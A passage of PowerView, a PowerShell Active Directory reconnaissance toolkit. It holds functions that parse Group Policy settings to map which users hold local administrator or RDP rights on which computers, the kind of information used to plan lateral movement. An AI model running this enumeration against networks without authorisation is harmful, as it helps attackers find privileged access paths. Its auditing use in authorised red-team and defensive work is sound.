or Group Policy preferences. Also return their user membership mappings, if they exist.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPO, Get-GptTmpl, Get-GroupsXML, ConvertTo-SID, ConvertFrom-SID  

.DESCRIPTION

First enumerates all GPOs in the current/target domain using Get-DomainGPO with passed
arguments, and for each GPO checks if 'Restricted Groups' are set with GptTmpl.inf or
group membership is set through Group Policy Preferences groups.xml files. For any
GptTmpl.inf files found, the file is parsed with Get-GptTmpl and any 'Group Membership'
section data is processed if present. Any found Groups.xml files are parsed with
Get-GroupsXML and those memberships are returned as well.

.PARAMETER Identity

A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.

.PARAMETER ResolveMembersToSIDs

Switch. Indicates that any member names should be resolved to their domain SIDs.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOLocalGroup

Returns all local groups set by GPO along with their members and memberof.

.EXAMPLE

Get-DomainGPOLocalGroup -ResolveMembersToSIDs

Returns all local groups set by GPO along with their members and memberof,
and resolve any members to their domain SIDs.

.EXAMPLE

'{0847C615-6C4E-4D45-A064-6001040CC21C}' | Get-DomainGPOLocalGroup

Return any GPO-set groups for the GPO with the given name/GUID.

.EXAMPLE

Get-DomainGPOLocalGroup 'Desktops'

Return any GPO-set groups for the GPO with the given display name.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOLocalGroup -Credential $Cred

.LINK

https://morgansimonsenblog.azurewebsites.net/tag/groups/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $ResolveMembersToSIDs,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Domain']) { $ConvertArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainGPO @SearcherArguments | ForEach-Object {
            $GPOdisplayName = $_.displayname
            $GPOname = $_.name
            $GPOPath = $_.gpcfilesyspath

            $ParseArgs =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }

            # first parse the 'Restricted Groups' file (GptTmpl.inf) if it exists
            $Inf = Get-GptTmpl @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $Memberships = @{}

                # parse the members/memberof fields for each entry
                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}
                    # extract out ALL members
                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        # if the resulting member is username and not a SID, attempt to resolve it
                        $GroupMembers = @()
                        ForEach ($Member in $MembershipValue) {
                            if ($Member -and ($Member.Trim() -ne '')) {
                                if ($Member -notmatch '^S-1-.*') {
                                    $ConvertToArguments = @{'ObjectName' = $Member}
                                    if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                    $MemberSID = ConvertTo-SID @ConvertToArguments

                                    if ($MemberSID) {
                                        $GroupMembers += $MemberSID
                                    }
                                    else {
                                        $GroupMembers += $Member
                                    }
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                        }
                        $MembershipValue = $GroupMembers
                    }

                    if (-not $Memberships[$Group]) {
                        $Memberships[$Group] = @{}
                    }
                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
                    $Memberships[$Group].Add($Relation, $MembershipValue)
                }

                ForEach ($Membership in $Memberships.GetEnumerator()) {
                    if ($Membership -and $Membership.Key -and ($Membership.Key -match '^\*')) {
                        # if the SID is already resolved (i.e. begins with *) try to resolve SID to a name
                        $GroupSID = $Membership.Key.Trim('*')
                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                            $GroupName = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName = $False
                        }
                    }
                    else {
                        $GroupName = $Membership.Key

                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
                            if ($Groupname -match 'Administrators') {
                                $GroupSID = 'S-1-5-32-544'
                            }
                            elseif ($Groupname -match 'Remote Desktop') {
                                $GroupSID = 'S-1-5-32-555'
                            }
                            elseif ($Groupname -match 'Guests') {
                                $GroupSID = 'S-1-5-32-546'
                            }
                            elseif ($GroupName.Trim() -ne '') {
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $GroupSID = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $GroupSID = $Null
                            }
                        }
                    }

                    $GPOGroup = New-Object PSObject
                    $GPOGroup | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                    $GPOGroup | Add-Member Noteproperty 'GPOName' $GPOName
                    $GPOGroup | Add-Member Noteproperty 'GPOPath' $GPOPath
                    $GPOGroup | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $GPOGroup | Add-Member Noteproperty 'Filters' $Null
                    $GPOGroup | Add-Member Noteproperty 'GroupName' $GroupName
                    $GPOGroup | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GPOGroup | Add-Member Noteproperty 'GroupMemberOf' $Membership.Value.Memberof
                    $GPOGroup | Add-Member Noteproperty 'GroupMembers' $Membership.Value.Members
                    $GPOGroup.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $GPOGroup
                }
            }

            # now try to the parse group policy preferences file (Groups.xml) if it exists
            $ParseArgs =  @{
                'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            Get-GroupsXML @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $GroupMembers = @()
                    ForEach ($Member in $_.GroupMembers) {
                        if ($Member -and ($Member.Trim() -ne '')) {
                            if ($Member -notmatch '^S-1-.*') {

                                # if the resulting member is username and not a SID, attempt to resolve it
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $MemberSID = ConvertTo-SID -Domain $Domain -ObjectName $Member

                                if ($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $_.GroupMembers = $GroupMembers
                }

                $_ | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                $_ | Add-Member Noteproperty 'GPOName' $GPOName
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}


function Get-DomainGPOUserLocalGroupMapping {
<#
.SYNOPSIS

Enumerates the machines where a specific domain user/group is a member of a specific
local group, all through GPO correlation. If no user/group is specified, all
discoverable mappings are returned.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPOLocalGroup, Get-DomainObject, Get-DomainComputer, Get-DomainOU, Get-DomainSite, Get-DomainGroup  

.DESCRIPTION

Takes a user/group name and optional domain, and determines the computers in the domain
the user/group has local admin (or RDP) rights to.

It does this by:
    1.  resolving the user/group to its proper SID
    2.  enumerating all groups the user/group is a current part of
        and extracting all target SIDs to build a target SID list
    3.  pulling all GPOs that set 'Restricted Groups' or Groups.xml by calling
        Get-DomainGPOLocalGroup
    4.  matching the target SID list to the queried GPO SID list
        to enumerate all GPO the user is effectively applied with
    5.  enumerating all OUs and sites and applicable GPO GUIs are
        applied to through gplink enumerating
    6.  querying for all computers under the given OUs or sites

If no user/group is specified, all user/group -> machine mappings discovered through
GPO relationships are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the user/group to identity GPO local group mappings for.

.PARAMETER LocalGroup

The local group to check access against.
Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
or a custom local SID. Defaults to local 'Administrators'.

.PARAMETER Domain

Specifies the domain to enumerate GPOs for, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOUserLocalGroupMapping

Find all user/group -> machine relationships where the user/group is a member
of the local administrators group on target machines.

.EXAMPLE

Get-DomainGPOUserLocalGroupMapping -Identity dfm -Domain dev.testlab.local

Find all computers that dfm user has local administrator rights to in
the dev.testlab.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOUserLocalGroupMapping -Credential $Cred

.OUTPUTS

PowerView.GPOLocalGroupMapping

A custom PSObject containing any target identity information and what local
group memberships they're a part of through GPO correlation.

.LINK

http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
    }

    PROCESS {
        $TargetSIDs = @()

        if ($PSBoundParameters['Identity']) {
            $TargetSIDs += Get-DomainObject @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
            $TargetObjectSID = $TargetSIDs
            if (-not $TargetSIDs) {
                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'"
            }
        }
        else {
            # no filtering/match all
            $TargetSIDs = @('*')
        }

        if ($LocalGroup -match 'S-1-5') {
            $TargetLocalSID = $LocalGroup
        }
        elseif ($LocalGroup -match 'Admin') {
            $TargetLocalSID = 'S-1-5-32-544'
        }
        else {
            # RDP
            $TargetLocalSID = 'S-1-5-32-555'
        }

        if ($TargetSIDs[0] -ne '*') {
            ForEach ($TargetSid in $TargetSids) {
                Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$TargetSid'"
                $TargetSIDs += Get-DomainGroup @CommonArguments -Properties 'objectsid' -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $TargetLocalSID"
        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $TargetSIDs"

        $GPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $GPOgroup = $_
            # if the locally set group is what we're looking for, check the GroupMembers ('members') for our target SID
            if ($GPOgroup.GroupSID -match $TargetLocalSID) {
                $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
                        $GPOgroup
                    }
                }
            }
            # if the group is a 'memberof' the group we're looking for, check GroupSID against the targt SIDs
            if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                    $GPOgroup
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $GPOgroups | Where-Object {$_} | ForEach-Object {
            $GPOname = $_.GPODisplayName
            $GPOguid = $_.GPOName
            $GPOPath = $_.GPOPath
            $GPOType = $_.GPOType
            if ($_.GroupMembers) {
                $GPOMembers = $_.GroupMembers
            }
            else {
                $GPOMembers = $_.GroupSID
            }

            $Filters = $_.Filters

            if ($TargetSIDs[0] -eq '*') {
                # if the * wildcard was used, set the targets to all GPO members so everything it output
                $TargetObjectSIDs = $GPOMembers
            }
            else {
                $TargetObjectSIDs = $TargetObjectSID
            }

            # find any OUs that have this GPO linked through gpLink
            Get-DomainOU @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                if ($Filters) {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($OUComputers) {
                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}

                    ForEach ($TargetSid in $TargetObjectSIDs) {
                        $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $GPOLocalGroupMapping = New-Object PSObject
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $OUComputers
                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $GPOLocalGroupMapping
                    }
                }
            }

            # find any sites that have this GPO linked through gpLink
            Get-DomainSite @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                ForEach ($TargetSid in $TargetObjectSIDs) {
                    $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                    $GPOLocalGroupMapping = New-Object PSObject
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $GPOLocalGroupMapping.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $GPOLocalGroupMapping
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {
<#
.SYNOPSIS

Takes a computer (or GPO) object and determines what users/groups are in the specified
local group for the machine through GPO correlation.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainGPOLocalGroup  

.DESCRIPTION

This function is the inverse of Get-DomainGPOUserLocalGroupMapping, and finds what users/groups
are in the specified local group for a target machine through GPO correlation.

If a -ComputerIdentity is specified, retrieve the complete computer object, attempt to
determine the OU the computer is a part of. Then resolve the computer's site name with
Get-NetComputerSiteName and retrieve all sites object Get-DomainSite. For those results, attempt to
enumerate all linked GPOs and associated local group settings with Get-DomainGPOLocalGroup. For
each resulting GPO group, resolve the resulting user/group name to a full AD object and
return the results. This will return the domain objects that are members of the specified
-LocalGroup for the given computer.

Otherwise, if -OUIdentity is supplied, the same process is executed to find linked GPOs and
localgroup specifications.

.PARAMETER ComputerIdentity

A SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
or a dns host name (e.g. windows10.testlab.local) for the computer to identity GPO local group mappings for.

.PARAMETER OUIdentity

An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a) for the OU to identity GPO local group mappings for.

.PARAMETER LocalGroup

The local group to check access against.
Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
or a custom local SID. Defaults to local 'Administrators'.

.PARAMETER Domain

Specifies the domain to enumerate GPOs for, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOComputerLocalGroupMapping -ComputerName WINDOWS3.testlab.local

Finds users who have local admin rights over WINDOWS3 through GPO correlation.

.EXAMPLE

Get-DomainGPOComputerLocalGroupMapping -Domain dev.testlab.local -ComputerName WINDOWS4.dev.testlab.local -LocalGroup RDP

Finds users who have RDP rights over WINDOWS4 through GPO correlation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOComputerLocalGroupMapping -Credential $Cred -ComputerIdentity SQL.testlab.local

.OUTPUTS

PowerView.GGPOComputerLocalGroupMember
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $ComputerIdentity,

        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $OUIdentity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $Computers = Get-DomainComputer @CommonArguments -Identity $ComputerIdentity -Properties 'distinguishedname,dnshostname'

            if (-not $Computers) {
                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name."
            }

            ForEach ($Computer in $Computers) {

                $GPOGuids = @()

                # extract any GPOs linked to this computer's OU through gpLink
                $DN = $Computer.distinguishedname
                $OUIndex = $DN.IndexOf('OU=')
                if ($OUIndex -gt 0) {
                    $OUName = $DN.SubString($OUIndex)
                }
                if ($OUName) {
                    $GPOGuids += Get-DomainOU @CommonArguments -SearchBase $OUName -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                # extract any GPOs linked to this computer's site through gpLink
                Write-Verbose "Enumerating the sitename for: $($Computer.dnshostname)"
                $ComputerSite = (Get-NetComputerSiteName -ComputerName $Computer.dnshostname).SiteName
                if ($ComputerSite -and ($ComputerSite -notmatch 'Error')) {
                    $GPOGuids += Get-DomainSite @CommonArguments -Identity $ComputerSite -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                # process any GPO local group settings from the GPO GUID set
                $GPOGuids | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $GPOGroup = $_

                    if($GPOGroup.GroupMembers) {
                        $GPOMembers = $GPOGroup.GroupMembers
                    }
                    else {
                        $GPOMembers = $GPOGroup.GroupSID
                    }

                    $GPOMembers | ForEach-Object {
                        $Object = Get-DomainObject @CommonArguments -Identity $_
                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $GPOComputerLocalGroupMember = New-Object PSObject
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ComputerName' $Computer.dnshostname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectSID' $_
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPODisplayName' $GPOGroup.GPODisplayName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOGuid' $GPOGroup.GPOName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOPath' $GPOGroup.GPOPath
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOType' $GPOGroup.GPOType
                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $GPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {
<#
.SYNOPSIS

Returns the default domain policy or the domain controller policy for the current
domain or a specified domain/domain controller.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPO, Get-GptTmpl, ConvertFrom-SID  

.DESCRIPTION

Returns the default domain policy or the domain controller policy for the current
